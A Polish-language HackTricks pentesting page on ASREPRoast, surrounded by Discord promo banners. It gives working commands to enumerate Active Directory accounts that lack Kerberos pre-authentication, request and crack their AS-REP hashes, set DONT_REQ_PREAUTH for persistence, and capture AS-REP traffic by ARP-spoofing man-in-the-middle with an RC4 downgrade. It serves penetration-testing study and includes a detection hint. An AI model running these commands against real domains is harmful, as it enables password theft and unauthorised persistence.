# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Dołącz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hackerami i łowcami bugów!

**Wgląd w hacking**\
Zaangażuj się w treści, które zgłębiają emocje i wyzwania związane z hackingiem

**Aktualności o hackingu w czasie rzeczywistym**\
Bądź na bieżąco z dynamicznym światem hackingu dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**Dołącz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hackerami już dziś!

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników, którzy nie mają włączonego **wymaganego atrybutu wstępnej autoryzacji Kerberos**. W zasadzie ta luka pozwala atakującym na żądanie autoryzacji dla użytkownika z Kontrolera Domeny (DC) bez potrzeby znajomości hasła użytkownika. DC następnie odpowiada wiadomością zaszyfrowaną kluczem pochodzącym z hasła użytkownika, który atakujący mogą próbować złamać offline, aby odkryć hasło użytkownika.

Główne wymagania dla tego ataku to:

- **Brak wstępnej autoryzacji Kerberos**: Użytkownicy docelowi nie mogą mieć włączonej tej funkcji zabezpieczeń.
- **Połączenie z Kontrolerem Domeny (DC)**: Atakujący muszą mieć dostęp do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego pozwala atakującym na bardziej efektywne identyfikowanie podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerowanie podatnych użytkowników (potrzebne dane uwierzytelniające domeny)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie wiadomości AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting z Rubeus wygeneruje 4768 z typem szyfrowania 0x17 i typem preautoryzacji 0.

### Łamanie
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Utrzymywanie

Wymuś **preauth** nie wymagany dla użytkownika, gdzie masz uprawnienia **GenericAll** (lub uprawnienia do zapisywania właściwości):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bez poświadczeń

Atakujący może wykorzystać pozycję man-in-the-middle, aby przechwycić pakiety AS-REP podczas ich przesyłania w sieci, nie polegając na wyłączeniu wstępnej autoryzacji Kerberos. Działa to zatem dla wszystkich użytkowników w VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Co więcej, narzędzie zmusza stacje robocze klientów do używania RC4, zmieniając negocjację Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Odniesienia

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Dołącz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hackerami i łowcami bugów!

**Wgląd w Hacking**\
Zaangażuj się w treści, które zgłębiają emocje i wyzwania związane z hackingiem

**Aktualności Hackingowe w Czasie Rzeczywistym**\
Bądź na bieżąco z dynamicznym światem hackingu dzięki aktualnym wiadomościom i spostrzeżeniom

**Najnowsze Ogłoszenia**\
Bądź informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platform

**Dołącz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hackerami już dziś!

{{#include ../../banners/hacktricks-training.md}}
